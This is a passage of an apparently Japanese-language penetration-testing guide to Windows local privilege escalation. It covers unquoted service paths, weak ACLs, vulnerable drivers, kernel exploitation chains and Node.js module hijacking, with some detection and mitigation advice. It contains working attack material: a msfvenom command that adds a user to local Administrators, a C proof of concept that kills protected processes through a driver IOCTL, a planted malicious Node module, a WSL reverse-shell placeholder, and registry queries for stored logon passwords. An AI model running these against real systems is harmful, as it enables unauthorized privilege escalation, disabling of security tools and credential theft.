		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**metasploitでこの脆弱性を検出して悪用できます:** `exploit/windows/local/trusted\_service\_path` metasploitを使って、サービスバイナリを手動で作成することもできます:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### 回復アクション

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指定するように設定できます。そのバイナリを置き換え可能な場合、privilege escalation が可能になることがあります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## スケジュールされたタスクのスクリプト対象

`.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する有効なタスクでは、`cmd.exe` だけでなく、**action arguments** で指定されたスクリプトも確認してください。PowerShell の `-File` など、インタープリターに明示的なファイル引数を渡す場合も同様です。スケジュールされたバッチファイルに `-File` を使った PowerShell の呼び出しが直接記述されている場合は、参照先スクリプトの ACL も調べてください。変数、条件分岐、シェルの連結が含まれる場合は、手動で追跡する必要があります。呼び出し元が書き込み可能なスクリプトまたは親ディレクトリは、設定されたタスクのプリンシパルが呼び出し元と異なり、かつタスクが実際にそのアクションを実行する場合に限り、アカウント間の実行につながる可能性があります。スクリプトでは追記のみ可能な ACL が問題になることがありますが、先行する `exit` などの制御フローにより、追記した行が実行されない場合もあります。privilege escalation を主張する前に、実効 ACL、[タスクの実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリ作成時にスクリプトを変更したり、タスクを開始したりしてはいけません。

## アクセス可能なファイルの名前付きストリーム

NTFS では、読み取り可能なファイルに名前付き `:$DATA` ストリームが含まれていることがあり、その内容は通常のディレクトリ一覧には表示されません。アクセス可能なバックアップファイルや設定ファイルのうち、関連性の高い少数のファイルについては、内容を開く前にストリームの**名前とサイズ**を確認してください。Windows では [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) と PowerShell の [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) で確認できます。秘密情報を示唆するストリーム名は、あくまで調査の手掛かりです。そのファイルへの実効読み取り権限、ファイルシステムがストリームをサポートしているか、ストリームに利用可能な認証情報が含まれているか、そしてそれらが実際にどのアカウントとして認証されるかを確認してください。通常の列挙では、再帰的なストリームスキャンやストリーム内容の出力は避けてください。

## スケジュールされた Windows Driver Kit ヘルパーの入力ファイル

オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、およびプロジェクトの `working\rsf.rsf` ファイルを読み込むことがあります。特権アカウントでこのヘルパーを起動するスケジュールされたタスクまたはサービスがある場合、ヘルパーの実行ファイル自体が保護されていても、これらの入力ファイルへの低権限ユーザーの書き込みアクセスによって、そのアカウントのコンテキストでコマンドを実行できる可能性があります。特権で実行するプロセスと、サイドカーファイル**両方**を作成または変更できることを確認してください。ヘルパーが存在するだけでは不十分です。

スケジュールされたタスクについては、そのアクションの [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) と、2 つのサイドカーパスの ACL を確認してください。タスクに作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手掛かりにすぎず、タスクがそこで入力ファイルを読み取る証拠にはなりません。プロジェクトの作業ファイルに関する前提条件も満たす必要があります。SYSTEM で実行されると決めつけず、実際のタスクプリンシパルを確認してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（上書きできれば privilege escalation が可能な場合があります）と、**フォルダーの権限**（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent の修復パス

[CVE-2024-0670](https://checkmk.com/werk/16361) は、`C:\Windows\Temp` にコマンドファイルを書き込み、置き換えに失敗すると既存の書き込み保護されたファイルを実行していた、古い Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストールされている正確な patch level と、影響を受ける agent の操作が実行可能かを確認してください。`2.1` のようなブランチのみの表示では、影響の有無を判断できません。列挙では、ファイルを作成したり agent のコマンドを実行したりせずに、バージョン、サービスの状態、Temp のアクセス許可を確認できます。

#### ADSelfService Plus SAML サービスの確認

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は ADSelfService Plus の build 6210 以前に影響し、ベンダーは build 6211 で修正しました。SAML SSO が**現在または過去に**有効だった場合にのみ関係します。そのため、インストール済み製品のエントリやサービスパスは手掛かりであり、脆弱性の判定ではありません。正確な build、SAML 設定の履歴、サービスへのネットワーク到達性、実行アカウントを確認してください。サービス経由のコード実行は、そのアカウントの権限を引き継ぎます。SYSTEM で実行されるのは、インスタンスが SYSTEM で実行されている場合に限られます。製品の Backup ディレクトリにある読み取り可能な `OfflineBackup_*.ezip` は、別個の暗号化バックアップに関する手掛かりであり、利用可能な認証情報やこの SAML の脆弱性を示す証拠ではありません。通常の列挙では、展開せずにパスとアクセス権を記録してください。

#### Jenkins controller とドメインアカウントの境界

Windows の Jenkins controller では、job の作成・設定権限と起動権限を区別してください。[Jenkins ではこれらを個別の `Job/Create`、`Job/Configure`、`Job/Build` 権限として説明しています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。設定済みのスケジュールやリモートトリガーが別の build 経路になる場合もありますが、それが有効であり、build が実際に実行されることを確認してください。実行時の ID は controller または選択された agent の ID であり、保存された認証情報を利用できるのは、その job が該当スコープにアクセスできる場合に限られます。これとは別に、`JENKINS_HOME` のメタデータへのアクセスを確認してください。Jenkins は認証情報のデータと暗号化キーを `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に保存します（[Jenkins の秘密情報ストレージ](https://www.jenkins.io/doc/developer/security/secrets/)）。これらが存在するだけではパスワードが判明するわけではありません。共有出力に秘密情報を表示せず、**必要なファイルへの読み取りアクセス**と、別個のアカウント再利用経路を確認してください。そのアカウントに AD user-object の `scriptPath` 書き込み権限がある場合は、書き込み可能なスクリプトパスと、対象ユーザーとして実行される実際のログオンまたはスケジュール実行の利用者が存在することを確認してから、ユーザー間実行と判断してください。さらにグループを制御できるかどうかは、AD の実効権限を個別に確認する必要があります。

#### Azure Pipelines self-hosted agent の ID

Azure DevOps Server または Azure Pipelines の project では、pipeline の**作成または編集**権限と、pipeline を**キューに追加**して選択した agent pool を使用する権限を区別してください。[Microsoft は pipeline の権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と[pool の認可](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)を個別に説明しています。権限の低いアカウントが script step を送信し、その pipeline を self-hosted Windows agent 上で実行できる場合、step は[agent に設定されたオペレーティングシステムのアカウント](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)で実行されます。ユーザー間または SYSTEM への権限移行を主張する前に、正確な pipeline、branch/resource の制限、認可された pool、実行可能な job、agent サービスの ID を確認してください。agent のインストール、project role、repository への書き込み権限だけでは手掛かりにすぎません。受動的な列挙中は build を開始せずに、権限とローカルのサービスメタデータを確認してください。

#### Microsoft Entra Connect Sync の認証情報

[Microsoft は](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)、同期サービスを実行して SQL database にアクセスする **ADSync service account** と、ディレクトリ権限が設定済みの同期機能によって異なる **AD DS connector account** を区別しています。connector の認証情報はその database に暗号化して保存され、キーのデータは[ADSync service account の下で DPAPI により保護されています](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。同期サービスがインストールされていること、ローカル管理者を連想させるグループがあること、または database を参照できることだけでは、復号可能な認証情報やドメインへの権限昇格があるとは判断できません。実際の database 読み取り権限、サービスアカウントとキーへのアクセス、インストール先と SQL の構成、設定済みの connector ID、その ID の実効 AD 権限を個別に確認してください。通常の列挙では、サービスとアクセスのメタデータのみを表示し、保存された秘密情報を照会したり表示したりしないでください。

#### プリンタードライバーのサポート DLL のアクセス許可

インストール済みのプリンタードライバーは、`C:\ProgramData` にサポート DLL を保存し、より高い権限を持つ print process で読み込む場合があります。printer WMI の列挙が拒否される場合でも、親ディレクトリと reparse point を含め、該当するドライバーのディレクトリと DLL の ACL を確認してください。[Ricoh printer-driver の問題 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) では、報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` でした。[元の公開情報](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) では、`PrintIsolationHost.exe` による DLL の読み込みが説明されています。書き込み可能な ACL は手掛かりにすぎません。拒否エントリを考慮した実効的な書き込み権限、該当ドライバーがインストールされており、特権 ID でそのファイルを読み込むこと、ベンダーの更新済みドライバーやセキュリティプログラムによってインストールが修正されているかを確認してください。ディレクトリ名やドライバーのバージョンだけから脆弱性を推定しないでください。

### Write Permissions

特権ファイルを読み取るために変更できる設定ファイルや、Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるか確認します。

システム内でアクセス許可の弱いフォルダーやファイルを見つける方法は、次のとおりです。

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダ内の plugin DLL を自動的にロードします。書き込み可能な portable/copy install がある場合、悪意のある plugin を配置すると、起動のたびに `notepad++.exe` 内で自動的に code execution が発生します（`DllMain` や plugin callbacks からも実行されます）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーによって実行される registry や binary を上書きできるか確認してください。**\
**以下のページを読んで、privilege escalation に利用できる興味深い autoruns locations について詳しく学んでください。**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

**サードパーティ製の怪しい/脆弱な** drivers を探してください。

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler でよく見られる）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation が可能です。<sup>[[13]](#references)</sup> 手順はこちらを参照してください。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Windows kernel-exploitation 関連資料:

ユーザーが書き込み可能な read/write register を使う kernel-mode ring-buffer のケースについては、[USB MIDI looped-streaming variant](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming) を参照してください。

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

脆弱な呼び出しが攻撃者制御の Object Manager path を開く race-condition bug では、lookup を意図的に遅らせる（最大長の component や深い directory chain を使う）ことで、時間枠を数マイクロ秒から数十マイクロ秒に延ばせます。

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

Windows kernel LPE chain の中には、単体では弱い2つの bug から構成できるものがあります。1つは、queue lock が保持されている間に request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは、`RtlCopyToUser` 中に解放済み paged-pool allocation を leak する **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

監査と exploit に関するメモ:

- **ロック中に解放し、その後に cancel**: 成功経路が **Acquire -> CompleteRequest/free -> Release**、cancel 経路が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** となる箇所を探します。成功経路が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` で待機中の thread が後から再開し、解放済みの `PFLT_CALLBACK_DATA` を driver の remove callback に渡す可能性があります。
- 同じサイズの攻撃者制御 paged-pool allocation で、解放された queue object を **reclaim** します。`NPFS` Data Queue Entry は payload とサイズを制御でき、後から pipe read/peek 操作で調べられるため有用です。解放された object に list link が含まれている場合は、それらをユーザーメモリ内の **偽の request node で構成した循環 list** で上書きし、元の list head で終了させず、driver に攻撃者定義の request structure を繰り返し処理させます。
- **予測可能な write を強化する**: 偽の request により bookkeeping write（timestamp / QPC / refcount に隣接する field）で使われる nested context pointer を変更できれば、**書き込み先アドレスは制御できるが、書き込み値は制御できない** kernel write を得られる場合があります。その場合、最終的な code/data pointer ではなく、spray した pool object の **length/size** field を狙い、破損した object から **範囲外の paged-pool read** が得られるまで spray を調べます。
- **race を利用できる disclosure のパターン**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、どれも有力な候補です。攻撃者がコピーされる buffer を大きくできる場合（たとえば、serializer の最終 allocation size を増やす list/resource entry を多数追加する場合）、コピー時間が延びて replacement window が広がり、必ずしもマシンを crash させずに信頼性を高められます。
- **pointer が多い refill 対象**: Windows **I/O ring** の registered-buffer array は、paged-pool size を攻撃者が制御でき（`8 * regBufferCnt`）、各要素が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、優れた disclosure 対象です。array を1つ leak し、周囲の `IORING_OBJECT` を特定したら、**`RegBuffers`** と **`RegBuffersCount`** を破損させ、後続の I/O ring 操作に攻撃者が偽造した entry を使わせることで、任意の kernel read/write を実現します。利用可能な write が安定した byte（たとえば `KUSER_SHARED_DATA+0x14` の値）しか書き込めない場合は、**重複する非アライン write** を使って `0x0101010101010101` のような同じ byte が繰り返される user pointer を構築し、`VirtualAlloc` で map して、その位置に偽造した registered-buffer array を配置します。<sup>[[30]](#references)</sup>

デバッグに役立つ指標:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

破損した I/O ring から任意の kernel read/write を取得したら、標準的なプリミティブ取得後の手順で SYSTEM token を奪取します:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### レジストリ hive のメモリ破損プリミティブ

最新の hive の脆弱性では、決定論的なメモリ配置を作り、書き込み可能な HKLM/HKU の子キーを悪用して、メタデータの破損をカスタム driver を使わずに kernel paged-pool overflow へと変換できます。攻撃チェーンの全容はこちら:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスを使った `RtlQueryRegistryValues` の direct-mode type confusion

一部の driver は userland からレジストリパスを受け取り、それが妥当な UTF-16 文字列であることだけを検証してから、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を呼び出し、`RTL_QUERY_REGISTRY_DIRECT` で `int readValue` のようなスタック上のスカラー値に書き込みます。`RTL_QUERY_REGISTRY_TYPECHECK` が指定されていない場合、`EntryContext` は開発者が想定した型ではなく、レジストリの**実際の**型に従って解釈されます。

これにより、次の2つの有用なプリミティブが得られます:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ユーザーが制御する絶対パス `\Registry\...` を使って、driver に攻撃者が選んだキーを問い合わせさせることができます。戻り値やログからキーの存在を漏えいさせたり、呼び出し元が直接アクセスできない値を読み取れたりする場合もあります。
- **Kernel memory corruption**: `&readValue` のようなスカラー値の格納先が、レジストリ値の型に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定されたバイナリバッファとして型誤認されます。

実用上の悪用に関する注意点:

- **Windows 8 以降の緩和策**: クエリが **untrusted hive** に対して行われ、`RTL_QUERY_REGISTRY_DIRECT` が指定されている一方で `RTL_QUERY_REGISTRY_TYPECHECK` が指定されていない場合、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` でクラッシュします。悪用可能な状態を保つには、`HKCU` の下に値を用意するのではなく、**trusted system hive 内の攻撃者が書き込み可能なキー**を探してください。
- **Trusted-hive staging**: NtObjectManager を使って `\Registry\Machine` の下にある書き込み可能な子キーを列挙し、複製した **low-integrity** token でもう一度スキャンして、sandbox 化されたコンテキストからアクセスできるキーを探します:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byteの`int`への8-byteの直接書き込みは、隣接するスタックデータを破損させ、近くのコールバック／関数ポインターを部分的に上書きする可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることが前提です。コードがまず攻撃者制御の`REG_DWORD`をスタックスカラーに読み込み、その後同じバッファを文字列読み込みに再利用する場合、攻撃者は`Length`/`MaximumLength`を制御し、`Buffer`ポインターにも部分的な影響を与えられるため、半制御のカーネル書き込みが可能になります。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`にある最初の`LONG`を符号付きバッファサイズとして扱います。先行する`REG_DWORD`読み込みによって、再利用されるスカラーに攻撃者制御の**負の値**が残っていると、次の`REG_BINARY`クエリは攻撃者のバイト列を隣接するスタックスロットへ直接コピーします。これは多くの場合、コールバックポインターを完全に上書きする最も簡単な方法です。

有力な探索パターン: **初期化し直さずに、同じスタック変数へ異なる型のレジストリ値を読み込むこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される`EntryContext`ポインター、および最初のレジストリ読み込みによって2回目の読み込みが実行されるかどうかが決まるコードパスをgrepしてください。

#### デバイスオブジェクトでのFILE_DEVICE_SECURE_OPENの設定漏れを悪用する（LPE + EDR kill）

一部の署名済みサードパーティ製ドライバーは、IoCreateDeviceSecureで強力なSDDLを指定してデバイスオブジェクトを作成する一方、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れます。このフラグがないと、余分なコンポーネントを含むパス経由でデバイスを開く際にセキュアDACLが適用されず、権限のないユーザーでも次のような名前空間パスを使ってハンドルを取得できます。<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile （実際の事例）

ユーザーがデバイスを開けるようになると、ドライバーが公開する特権IOCTLを悪用してLPEや改ざんを実行できます。実際に確認された機能の例:
- 任意のプロセスへのフルアクセスハンドルを返す（トークン窃取 / DuplicateTokenEx/CreateProcessAsUserによるSYSTEMシェル）。
- 制限のないraw disk読み書き（オフラインでの改ざん、起動時の永続化手法）。
- Protected Process/Light（PP/PPL）を含む任意のプロセスを終了させ、カーネル経由でuser landからAV/EDRを停止する。

最小PoCパターン（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACLで制限するデバイスオブジェクトを作成する際は、必ず FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作では呼び出し元のコンテキストを検証する。プロセスの終了やハンドルの返却を許可する前に、PP/PPL のチェックを追加する。
- IOCTL（アクセスマスク、METHOD_*、入力検証）を制限し、カーネル権限を直接与える代わりに、ブローカーを介するモデルを検討する。

防御側の検知アイデア
- 不審なデバイス名（例: \\ .\\amsdk*）に対するユーザーモードからのオープンや、悪用を示す特定の IOCTL シーケンスを監視する。
- Microsoft の脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可リスト／拒否リストを管理する。


## PATH DLL Hijacking

**PATH 上にあるフォルダー内への書き込み権限**があれば、プロセスが読み込む DLL を hijack し、**権限を昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH 内のすべてのフォルダーの権限を確認します:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

このチェックを悪用する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` 経由の Node.js / Electron モジュール解決 hijacking

これは、期待されるモジュールが**見つからない**場合に、`require("foo")` のような bare import を実行する **Node.js** および **Electron** アプリケーションに影響する、**Windows uncontrolled search path** の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上にたどり、各親ディレクトリにある `node_modules` フォルダーを確認して、パッケージを解決します。Windows では、この探索がドライブのルートまで到達することがあります。そのため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、次の場所を順に調べる可能性があります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（またはパッケージフォルダー）を配置し、**より高い権限で動作する Node/Electron プロセス**が不足している依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者として実行されている場合、昇格されたスケジュールタスクやサービスラッパーから実行されている場合、または特権を持つデスクトップアプリとして自動起動される場合、これは **LPE** につながります。

特に、次のような場合によく発生します。

- 依存関係が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- サードパーティライブラリが `require("foo")` を `try/catch` で囲み、失敗しても処理を続行する
- 本番ビルドからパッケージが削除された、パッケージ化時に含まれなかった、またはインストールに失敗した
- 脆弱な `require()` がメインアプリケーションのコードではなく、依存関係ツリーの深い場所にある

### 脆弱なターゲットの調査

**Procmon** を使って解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` を対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）に設定してフィルターする
- `Path` に `node_modules` が `contains` する条件でフィルターする
- `NAME NOT FOUND` と、`C:\node_modules` 以下で最後に成功したオープンに注目する

展開済みの `.asar` ファイルやアプリケーションソースで、コードレビュー時に役立つパターン：

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon またはソースのレビューから **missing package name** を特定します。
2. 存在しない場合は、root lookup directory を作成します。

```powershell
mkdir C:\node_modules
```

3. 想定される正確な名前のモジュールを配置する:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. victim application を起動します。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに当てはまる、実際に見られる optional module の例として `bluebird` と `utf-8-validate` があります。ただし、再利用可能な部分は **technique** です。特権を持つ Windows Node/Electron プロセスが解決する、任意の **missing bare import** を探します。

### 検出とハードニングのアイデア

- ユーザーが `C:\node_modules` を作成したり、新しい `.js` ファイルや package をそこに書き込んだりした場合にアラートを出します。
- 高い整合性レベルのプロセスが `C:\node_modules\*` から読み込んでいないか調査します。
- 本番環境ではすべての runtime dependencies を package に含め、`optionalDependencies` の使用状況を監査します。
- サードパーティのコードに、エラーを無視する `try { require("...") } catch {}` パターンがないか確認します。
- ライブラリが対応している場合は optional probe を無効にします（たとえば、一部の `ws` 環境では `WS_NO_UTF_8_VALIDATE=1` を設定して、旧式の `utf-8-validate` probe を回避できます）。

## ネットワーク

### 共有フォルダー

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts ファイル

hosts ファイルにハードコードされている、ほかの既知のコンピューターを確認する。

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースと DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開放ポート

外部から**制限されたサービス**を確認する

```bash
netstat -ano #Opened ports?
```

ローカルリスナーについては、PIDをプロセス所有者、実行ファイルのパス、および起動元のサービスやスケジュールタスクと照合します。リモートコントロールサービスからデスクトップユーザーとしてアクセスできるのは、認証とコマンド制御の設定がそれを許可している場合に限られます。より高い権限を持つアカウントで実行されているカスタムTCPアプリケーションは、別途調査すべき対象です。リスナーとバイナリのパスは受動的な手掛かりにすぎません。認証を経由したメモリ破損の経路を確認するには、その正確なバイナリと、そこに到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合は、バックエンドサービスを特定する前に [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) と照合します。転送ルールがあるだけでは、転送先に到達可能であることや脆弱であることの証明にはなりません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARPテーブル

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### ファイアウォール ルール

[**ファイアウォール関連のコマンドについてはこのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化...）**

ネットワーク列挙用の[コマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root ユーザーを取得すると、任意のポートで listen できます（`nc.exe` で初めてポートを listen するとき、ファイアウォールで `nc` を許可するかどうかを GUI で確認されます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

bash を root として簡単に起動するには、`--default-user root` を試してください。

`WSL` のファイルシステムは、`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで確認できます。

WSL 内の Linux の `root` であっても、それだけで Windows の Administrator 権限が得られるわけではありません。現在の Windows ID でディストリビューションのファイルシステムを読み取れる場合は、コマンドや認証情報が記録されている可能性のあるシェル履歴ファイル（`/root/.bash_history` など）を確認してください。ただし、権限昇格には、より高い権限を持つ有効なアカウントと、許可された認証経路が必要です。`LocalState\rootfs` の構成は古い WSL インストールに該当します。WSL 2 では一般にディストリビューションが [`ext4.vhdx` 仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space) に保存されるため、まず実際のディストリビューションと保存先を特定してください。自動列挙中に履歴の内容を出力するのは避けてください。

## Windows の認証情報

### Winlogon の認証情報

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
